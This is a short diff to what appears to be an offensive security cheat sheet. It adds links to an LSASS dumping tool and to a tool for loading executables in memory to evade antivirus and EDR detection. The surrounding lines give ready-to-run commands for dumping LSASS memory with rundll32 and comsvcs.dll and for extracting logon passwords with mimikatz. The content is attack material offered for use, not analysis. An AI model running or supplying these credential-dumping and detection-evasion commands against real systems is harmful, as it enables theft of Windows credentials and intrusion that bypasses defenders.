@@ -204,6 +204,12 @@ find / -perm -777 -type f 2>/dev/null
 "rundll32 C:\windows\system32\comsvcs.dll MiniDump "1234 dump.bin full""
 rundll32.exe  comsvcs.dll,#24 600 C:\Users\user\Desktop\lsass.dmp full
 
+#nanodump lsass
+https://github.com/helpsystems/nanodump
+
+#load pe in memory avoid av edr detection
+https://github.com/D1rkMtr/FilelessRemotePE
+
 # mimikatz param
 mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\tmp\mimikatz_output.txt
 ```
